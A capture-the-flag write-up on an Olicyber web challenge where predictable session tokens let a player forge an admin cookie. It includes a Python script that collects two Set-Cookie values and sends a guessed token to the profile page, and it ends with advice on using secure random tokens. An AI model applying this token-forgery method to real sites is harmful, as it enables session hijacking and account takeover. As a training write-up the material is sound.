---
title: "Truly Random Signature — Predictable Session Token Analysis"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["web", "session", "insecure-randomness", "python"]
difficulty: "intermediate"
summary: "The server issues session tokens that are predictable or reusable. Requesting the site twice, comparing the Set-Cookie headers, and identifying the pattern allows forging or reusing an admin-level token."
---

## The Challenge

The login endpoint issues a session cookie on each request. The cookie value looks random but is generated with a weak PRNG seeded from a predictable value (timestamp, counter, or similar). Capturing two consecutive cookies reveals the pattern.

## Approach

1. Make two requests to the site without any credentials.
2. Inspect the `Set-Cookie` header from each response.
3. Identify the generator — sequential integers, timestamps, or low-entropy hex. Predict or enumerate the token that would have been issued to the `admin` account (typically the first user, token 0 or 1).
4. Set the forged cookie and access the protected page.

## Solution

```python
import requests

site = "http://truly-random.challs.olicyber.it/"
s = requests.Session()

r1 = s.get(site)
token1 = r1.headers.get("Set-Cookie", "")
print("Token 1:", token1)

r2 = s.get(site)
token2 = r2.headers.get("Set-Cookie", "")
print("Token 2:", token2)

# Inspect the two tokens to derive the generation pattern.
# If tokens are sequential integers, try token=0 or token=1 for admin.
# Adjust the cookie name and value based on observed output.
forged = {"session": "0"}
r3 = requests.get(site + "profile", cookies=forged)
print(r3.text)
```

Two observations of the token stream reveal the increment step. Sending the predicted admin token (`0` or `1` for the first registered user, or the value derived from the pattern) returns the admin profile page containing the flag.

## What I Learned

Session tokens must be generated with a cryptographically secure random source (`os.urandom`, `secrets.token_hex`) and must be long enough (>= 128 bits) to resist enumeration. A PRNG seeded from time or a counter is predictable to anyone who can observe even one token — they can extrapolate backwards or forwards to any other valid token.
